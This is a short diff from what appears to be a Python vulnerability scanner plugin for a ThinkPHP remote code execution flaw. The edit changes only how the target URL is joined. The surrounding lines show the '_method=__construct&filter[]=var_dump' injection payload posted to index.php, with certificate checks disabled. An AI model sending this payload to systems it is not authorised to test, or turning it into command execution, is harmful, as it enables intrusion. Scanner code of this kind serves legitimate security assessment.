@@ -23,7 +23,7 @@ def run(url, timeout):
     }
     payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
     try:
-        vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
+        vurl = url + '/index.php?s=index/index/index'
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
         if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
             result['vulnerable'] = True
